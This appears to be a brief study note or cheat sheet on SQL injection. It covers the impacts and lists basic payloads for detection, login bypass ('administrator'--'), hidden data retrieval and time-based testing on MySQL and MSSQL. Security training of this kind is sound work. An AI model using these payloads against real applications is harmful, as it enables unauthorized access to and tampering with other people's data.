# SQL Injection

## Definition

SQL Injection allows attackers to interfere with database queries.

---

# Impact

- Read sensitive data
- Modify data
- Delete data
- Authentication bypass
- RCE in some cases

---

# Detection

## Basic Test

```sql
'
```

---

## Boolean Tests

```sql
OR 1=1--
OR 1=2--
```

---

## Login Bypass

```sql
administrator'--
```

---

# Hidden Data Retrieval

Example:

```sql
Gifts'--
```

Removes:

```sql
AND released = 1
```

---

# Time-Based SQLi

## MySQL

```sql
SLEEP(5)
```

## MSSQL

```sql
WAITFOR DELAY '0:0:5'
```

---

# Comments

```sql
--
```

Used to ignore the rest of the query.

---

# Notes

SQLi may lead to:
- Full database compromise
- Server compromise
- Data leakage
